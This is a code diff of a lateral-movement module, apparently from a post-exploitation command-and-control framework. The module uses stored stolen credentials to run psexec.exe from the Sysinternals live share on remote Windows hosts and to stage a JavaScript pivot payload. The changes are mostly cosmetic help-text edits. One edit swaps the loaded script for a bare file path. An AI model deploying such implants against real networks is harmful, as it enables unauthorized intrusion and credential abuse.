@@ -6,7 +6,7 @@ import os.path
 
 class PsExecLiveJob(core.job.Job):
     def done(self):
-        self.results = "Completed"
+        self.results = "Completed!"
         self.display()
 
     def display(self):
@@ -29,16 +29,14 @@ class PsExecLiveImplant(core.implant.Implant):
         self.options.register("SMBDOMAIN", ".", "Domain for login.")
         self.options.register("CREDID", "", "Cred ID from creds.")
         #self.options.register("PAYLOAD", "", "payload to stage")
-        self.options.register("RPATH", "\\\\\\\\live.sysinternals.com@SSL\\\\tools\\\\", "path to psexec.exe")
+        self.options.register("RPATH", "\\\\\\\\live.sysinternals.com@SSL\\\\tools\\\\", "Path to psexec.exe.")
         self.options.register("DIRECTORY", "%TEMP%", "Writeable directory for output.", required=False)
-        # self.options.register("FILE", "", "random uuid for file name", hidden=True)
+        # self.options.register("FILE", "", "Random uuid for file name.", hidden=True)
 
     def job(self):
         return PsExecLiveJob
 
     def run(self):
-        # generate new file every time this is run
-        # self.options.set("FILE", uuid.uuid4().hex)
         cred_id = self.options.get("CREDID")
         if cred_id:
             key = self.shell.creds_keys[int(cred_id)]
@@ -57,5 +55,5 @@ class PsExecLiveImplant(core.implant.Implant):
         self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
 
         payloads = {}
-        payloads["js"] = self.loader.load_script("data/implant/pivot/exec_psexec.js", self.options)
+        payloads["js"] = "data/implant/pivot/exec_psexec.js"
         self.dispatch(payloads, self.job)
